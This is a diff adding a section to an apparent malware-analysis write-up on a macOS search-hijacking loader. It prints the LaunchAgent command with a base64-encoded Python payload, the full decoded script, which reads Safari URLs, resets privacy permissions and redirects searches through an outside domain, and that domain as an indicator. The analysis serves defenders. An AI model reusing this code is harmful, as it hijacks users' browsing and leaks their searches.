@@ -543,3 +543,133 @@ launchctl unload com.chrome.extensionsPop
 sudo -u <username> launchctl unload com.chrome.extension
 sudo -u <username> launchctl unload com.chrome.extensionsPop
 ```
+
+### Newer variant of Mac-ChoziosiLoader utilizes Python scripts for persistence
+
+```sh
+Path: /Users/profile/Library/LaunchAgents/com.extension.pop.plist
+
+Command:
+sh -c echo aW1wb3J0IG9zCmltcG9ydCBzc2wKaW1wb3J0IHRpbWUKaW1wb3J0IHVybGxpYjIKaW1wb3J0IHN1YnByb2Nlc3MKCk5PX0FVVEhfVENDID0gIk5vdCBhdXRob3JpemVkIgpSRVNFVF9UQ0MgPSAidGNjdXRpbCByZXNldCBBcHBsZUV2ZW50cyIKU0FGQVJJX0VSUk9SID0gIlNhZmFyaSBnb3QgYW4gZXJyb3IiCgpjaGVja191cmxfb3NhID0gIiIib3Nhc2NyaXB0IC1lICd0ZWxsIGFwcGxpY2F0aW9uICJzYWZhcmkiCnNldCBjdXJVUkwgdG8gVVJMIGluIGZyb250IGRvY3VtZW50CnJldHVybiBjdXJVUkwKZW5kIHRlbGwnIiIiCgpzZXRfdXJsX29zYSA9ICIiIm9zYXNjcmlwdCAtZSAndGVsbCBhcHBsaWNhdGlvbiAic2FmYXJpIgpzZXQgVVJMIGluIGZyb250IGRvY3VtZW50IHRvICIjI1VSTCMjIgplbmQgdGVsbCciIiIKClRDQ19JTlRFUlZBTCA9IDEwClNBRkFSSV9FUlJPUl9JTlRFUlZBTCA9IDEKU0FNUExFX0lOVEVSVkFMID0gMC4xCgpkZWYgaXNfYWxyZWR5X3J1bm5pbmcoKToKICAgIHByb2NzID0gb3MucG9wZW4oJ3BzIGF1eCcpLnJlYWQoKQogICAgbGluZXNfbWF0Y2ggPSAwCiAgICBmb3IgbGluZSBpbiBwcm9jcy5zcGxpdCgiXG4iKToKICAgICAgICBpZiAiYmFzZTY0IC0tZGVjb2RlIHwgcHl0aG9uIiBpbiBsaW5lOgogICAgICAgICAgICBsaW5lc19tYXRjaCArPSAxCgogICAgaWYgbGluZXNfbWF0Y2ggPiAxOgogICAgICAgIHJldHVybiBUcnVlCgogICAgcmV0dXJuIEZhbHNlCgpkZWYgcnVuX29zYSh0b19ydW4pOgoKICAgIHN1Yl9wcm9jID0gc3VicHJvY2Vzcy5Qb3Blbih0b19ydW4sIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCiAgICByZXQgPSBzdWJfcHJvYy5zdGRvdXQucmVhZCgpLmRlY29kZSgidXRmLTgiKQogICAgcmV0X2VyciA9IHN1Yl9wcm9jLnN0ZGVyci5yZWFkKCkuZGVjb2RlKCJ1dGYtOCIpCiAgICBzdWJfcHJvYy5raWxsKCkKCiAgICBpZiBOT19BVVRIX1RDQyBpbiByZXRfZXJyOgogICAgICAgIHJldHVybiBOT19BVVRIX1RDQwoKICAgIGlmIFNBRkFSSV9FUlJPUiBpbiByZXRfZXJyOgogICAgICAgIHJldHVybiBTQUZBUklfRVJST1IKCiAgICByZXR1cm4gcmV0CgpkZWYgc2VuZF9oZWFydGJlYXQoaXNfYXV0aCk6CiAgICB1cmwgPSAiaHR0cHM6Ly9ldG9iZXBhcnRvdS5jb20vaGI/ZXh0PXNhZiZ2ZXI9NCZpcz0wJmRkPU1UUTBNekFIQVFRS0NRZ0hCUXNJQ1FBRUFBUUhCZ01FVEFnSERRTUFBMGdGQlFRSUFRWUxCZ0FBU0E9PSZxPSIgKyBpc19hdXRoLnJlcGxhY2UoIiAiLCJfIikKICAgIHJlcSA9IHVybGxpYjIuUmVxdWVzdCh1cmwpCiAgICByZXEuYWRkX2hlYWRlcigndXNlci1hZ2VudCcsICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNV83KSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTUuMiBTYWZhcmkvNjA1LjEuMTUnKQogICAgY3R4ID0gc3NsLmNyZWF0ZV9kZWZhdWx0X2NvbnRleHQoKQogICAgY3R4LmNoZWNrX2hvc3RuYW1lID0gRmFsc2UKICAgIGN0eC52ZXJpZnlfbW9kZSA9IHNzbC5DRVJUX05PTkUKICAgIHRyeToKICAgICAgICB4ID0gdXJsbGliMi51cmxvcGVuKHJlcSwgY29udGV4dD1jdHgpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwoKaWYgaXNfYWxyZWR5X3J1bm5pbmcoKToKICAgIGV4aXQoKQoKbGFzdF91cmwgPSAiIgpsYXN0X3F1ZXJ5ID0gIiIKc2FtcGxlX2NvdW50ZXIgPSAwCgp3aGlsZSBUcnVlOgoKICAgIHJldHVybl91cmwgPSBydW5fb3NhKGNoZWNrX3VybF9vc2EpCgogICAgaWYgc2FtcGxlX2NvdW50ZXIgPj0gMzYwMCBvciBzYW1wbGVfY291bnRlciA9PSAwOgogICAgICAgIHNhbXBsZV9jb3VudGVyID0gMAogICAgICAgIHNlbmRfaGVhcnRiZWF0KHJldHVybl91cmwpCgogICAgaWYgcmV0dXJuX3VybCA9PSBOT19BVVRIX1RDQzoKICAgICAgICBvcy5zeXN0ZW0oUkVTRVRfVENDKQogICAgICAgIHNhbXBsZV9jb3VudGVyICs9IFRDQ19JTlRFUlZBTAogICAgICAgIHRpbWUuc2xlZXAoVENDX0lOVEVSVkFMKQoKICAgIGVsaWYgcmV0dXJuX3VybCA9PSBTQUZBUklfRVJST1I6CiAgICAgICAgc2FtcGxlX2NvdW50ZXIgKz0gU0FGQVJJX0VSUk9SX0lOVEVSVkFMCiAgICAgICAgdGltZS5zbGVlcChTQUZBUklfRVJST1JfSU5URVJWQUwpCgogICAgZWxzZToKCiAgICAgICAgaWYgcmV0dXJuX3VybCAhPSBsYXN0X3VybDoKICAgICAgICAgICAgbGFzdF91cmwgPSByZXR1cm5fdXJsCgogICAgICAgIHF1ZXJ5ID0gRmFsc2UKCiAgICAgICAgaWYgImdvb2dsZS5jb20vc2VhcmNoPyIgaW4gbGFzdF91cmwgYW5kICJjb21wbGV0ZS8iIG5vdCBpbiBsYXN0X3VybDoKICAgICAgICAgICAgcXVlcnkgPSBsYXN0X3VybC5zcGxpdCgicT0iKVsxXS5zcGxpdCgiJiIpWzBdCgogICAgICAgIGlmICJzZWFyY2gueWFob28uY29tL3NlYXJjaCIgaW4gbGFzdF91cmw6CiAgICAgICAgICAgIHF1ZXJ5ID0gbGFzdF91cmwuc3BsaXQoInA9IilbMV0uc3BsaXQoIiYiKVswXQoKICAgICAgICBpZiAiYmluZy5jb20vc2VhcmNoPyIgaW4gbGFzdF91cmw6CiAgICAgICAgICAgIHF1ZXJ5ID0gbGFzdF91cmwuc3BsaXQoInE9IilbMV0uc3BsaXQoIiYiKVswXQoKICAgICAgICBpZiBxdWVyeSBhbmQgcXVlcnkgIT0gbGFzdF9xdWVyeToKICAgICAgICAgICAgbmV3X3VybCA9ICJodHRwczovL2V0b2JlcGFydG91LmNvbS9zZWFyY2g/ZXh0PXNhZiZ2ZXI9NCZpcz0wJmRkPU1UUTBNekFIQVFRS0NRZ0hCUXNJQ1FBRUFBUUhCZ01FVEFnSERRTUFBMGdGQlFRSUFRWUxCZ0FBU0E9PSZxPSIgKyBxdWVyeQogICAgICAgICAgICBuZXdfdXJsX29zYSA9IHNldF91cmxfb3NhLnJlcGxhY2UoIiMjVVJMIyMiLCBuZXdfdXJsKQogICAgICAgICAgICBydW5fb3NhKG5ld191cmxfb3NhKQogICAgICAgICAgICBsYXN0X3F1ZXJ5ID0gcXVlcnkKCiAgICAgICAgc2FtcGxlX2NvdW50ZXIgKz0gU0FNUExFX0lOVEVSVkFMCiAgICAgICAgdGltZS5zbGVlcChTQU1QTEVfSU5URVJWQUwp | base64 --decode | python | bash
+```
+
+### Base64 Decoded Python script
+
+```py
+import os
+import ssl
+import time
+import urllib2
+import subprocess
+
+NO_AUTH_TCC = "Not authorized"
+RESET_TCC = "tccutil reset AppleEvents"
+SAFARI_ERROR = "Safari got an error"
+
+check_url_osa = """osascript -e 'tell application "safari"
+set curURL to URL in front document
+return curURL
+end tell'"""
+
+set_url_osa = """osascript -e 'tell application "safari"
+set URL in front document to "##URL##"
+end tell'"""
+
+TCC_INTERVAL = 10
+SAFARI_ERROR_INTERVAL = 1
+SAMPLE_INTERVAL = 0.1
+
+def is_alredy_running():
+    procs = os.popen('ps aux').read()
+    lines_match = 0
+    for line in procs.split("\n"):
+        if "base64 --decode | python" in line:
+            lines_match += 1
+
+    if lines_match > 1:
+        return True
+
+    return False
+
+def run_osa(to_run):
+
+    sub_proc = subprocess.Popen(to_run, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    ret = sub_proc.stdout.read().decode("utf-8")
+    ret_err = sub_proc.stderr.read().decode("utf-8")
+    sub_proc.kill()
+
+    if NO_AUTH_TCC in ret_err:
+        return NO_AUTH_TCC
+
+    if SAFARI_ERROR in ret_err:
+        return SAFARI_ERROR
+
+    return ret
+
+def send_heartbeat(is_auth):
+    url = "https://etobepartou.com/hb?ext=saf&ver=4&is=0&dd=MTQ0MzAHAQQKCQgHBQsICQAEAAQHBgMETAgHDQMAA0gFBQQIAQYLBgAASA==&q=" + is_auth.replace(" ","_")
+    req = urllib2.Request(url)
+    req.add_header('user-agent', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15')
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        x = urllib2.urlopen(req, context=ctx)
+    except:
+        pass
+
+if is_alredy_running():
+    exit()
+
+last_url = ""
+last_query = ""
+sample_counter = 0
+
+while True:
+
+    return_url = run_osa(check_url_osa)
+
+    if sample_counter >= 3600 or sample_counter == 0:
+        sample_counter = 0
+        send_heartbeat(return_url)
+
+    if return_url == NO_AUTH_TCC:
+        os.system(RESET_TCC)
+        sample_counter += TCC_INTERVAL
+        time.sleep(TCC_INTERVAL)
+
+    elif return_url == SAFARI_ERROR:
+        sample_counter += SAFARI_ERROR_INTERVAL
+        time.sleep(SAFARI_ERROR_INTERVAL)
+
+    else:
+
+        if return_url != last_url:
+            last_url = return_url
+
+        query = False
+
+        if "google.com/search?" in last_url and "complete/" not in last_url:
+            query = last_url.split("q=")[1].split("&")[0]
+
+        if "search.yahoo.com/search" in last_url:
+            query = last_url.split("p=")[1].split("&")[0]
+
+        if "bing.com/search?" in last_url:
+            query = last_url.split("q=")[1].split("&")[0]
+
+        if query and query != last_query:
+            new_url = "https://etobepartou.com/search?ext=saf&ver=4&is=0&dd=MTQ0MzAHAQQKCQgHBQsICQAEAAQHBgMETAgHDQMAA0gFBQQIAQYLBgAASA==&q=" + query
+            new_url_osa = set_url_osa.replace("##URL##", new_url)
+            run_osa(new_url_osa)
+            last_query = query
+
+        sample_counter += SAMPLE_INTERVAL
+        time.sleep(SAMPLE_INTERVAL)
+```
+
+### Periodic web requests made
+
+```
+etobepartou.com
+```
